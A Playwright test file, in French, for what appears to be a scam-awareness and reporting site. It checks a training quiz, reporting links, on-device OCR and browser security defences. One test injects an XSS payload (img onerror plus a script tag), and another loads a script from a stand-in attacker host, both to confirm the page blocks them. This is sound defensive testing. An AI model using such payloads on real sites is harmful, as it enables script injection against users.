// Parcours des pages d'entrainement et d'information, et proprietes de securite dans le navigateur.
"use strict";
const { test, expect } = require("@playwright/test");

function surveillerSorties(page) {
  const sorties = [];
  page.on("request", (r) => { if (!/^(http:\/\/127\.0\.0\.1:4173|data:|blob:)/.test(r.url())) sorties.push(r.url()); });
  return sorties;
}

test("s'entrainer : douze situations, explication et score final", async ({ page }) => {
  const sorties = surveillerSorties(page);
  await page.goto("/apprendre.html");
  await page.click("#start");
  for (let i = 0; i < 12; i++) {
    await expect(page.locator("#prog-txt")).toContainText(`${i + 1}`);
    await page.locator("#choices .choice").first().click();
    await expect(page.locator("#verdict")).toBeVisible();
    await expect(page.locator("#v-methode")).not.toBeEmpty();
    await expect(page.locator("#choices .choice.good")).toHaveCount(1);
    await page.click("#next");
  }
  await expect(page.locator("#fin")).toBeVisible();
  await expect(page.locator("#score")).toHaveText(/^\d+ \/ 12$/);
  expect(sorties).toEqual([]);
});

test("s'entrainer : la langue change pendant la partie", async ({ page }) => {
  await page.goto("/apprendre.html");
  await page.click("#start");
  const fr = await page.locator("#scene").textContent();
  await page.click('[data-lang="wo"]');
  const wo = await page.locator("#scene").textContent();
  expect(wo).not.toEqual(fr);
  await expect(page.locator("#prog-txt")).toContainText("Xew 1");
});

test("ou signaler : plateforme officielle et liens sans referent", async ({ page }) => {
  const sorties = surveillerSorties(page);
  await page.goto("/ou-signaler.html");
  await expect(page.locator("#now li")).toHaveCount(4);
  const lien = page.locator('a[href="https://signalementcyber.dgpn.sn"]');
  await expect(lien).toHaveAttribute("rel", /noopener/);
  await expect(lien).toHaveAttribute("rel", /noreferrer/);
  await expect(page.locator('nav a[aria-current="page"]')).toHaveAttribute("href", "ou-signaler.html");
  expect(sorties).toEqual([]);
});

test("une injection dans le message reste du texte", async ({ page }) => {
  await page.goto("/signaler.html");
  await page.fill("#msg", '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script> Bonjour, ceci est un essai.');
  await expect(page.locator("#preview")).toContainText("<img src=x");
  expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  expect(await page.locator("#preview img, #preview script").count()).toBe(0);
});

test("la page refuse d'etre encadree par un autre site", async ({ page }) => {
  await page.setContent('<iframe id="f" src="http://127.0.0.1:4173/signaler.html" width="800" height="600"></iframe>');
  const cadre = page.frameLocator("#f");
  await page.waitForTimeout(1500);
  await expect(cadre.locator("#msg")).toHaveCount(0);
});

test("la CSP bloque un script injecte depuis l'exterieur", async ({ page }) => {
  const violations = [];
  page.on("console", (m) => { if (/Content Security Policy/i.test(m.text())) violations.push(m.text()); });
  await page.goto("/signaler.html");
  await page.evaluate(() => {
    const s = document.createElement("script");
    s.src = "https://exemple-attaquant.invalid/x.js";
    document.head.appendChild(s);
  });
  await page.waitForTimeout(500);
  expect(violations.length).toBeGreaterThan(0);
});

test("lecture de capture : OCR sur l'appareil, sans envoi de l'image", async ({ page }) => {
  test.setTimeout(90000);
  const sorties = surveillerSorties(page);
  await page.goto("/signaler.html");
  // fabrique une capture d'ecran fictive dans le navigateur
  const png = await page.evaluate(() => {
    const c = document.createElement("canvas");
    c.width = 900; c.height = 220;
    const x = c.getContext("2d");
    x.fillStyle = "#fff"; x.fillRect(0, 0, c.width, c.height);
    x.fillStyle = "#000"; x.font = "40px Arial";
    x.fillText("Votre code est 482913", 30, 90);
    x.fillText("Merci de votre confiance", 30, 160);
    return c.toDataURL("image/png").split(",")[1];
  });
  await page.setInputFiles("#shot", { name: "capture.png", mimeType: "image/png", buffer: Buffer.from(png, "base64") });
  await expect(page.locator("#ocr-status")).toHaveText(/extrait|génn/, { timeout: 80000 });
  await expect(page.locator("#preview")).toContainText("[CODE]");
  await expect(page.locator("#preview")).toContainText(/Merci/i);
  await expect(page.locator("#preview")).not.toContainText("482913");
  expect(sorties).toEqual([]);
});
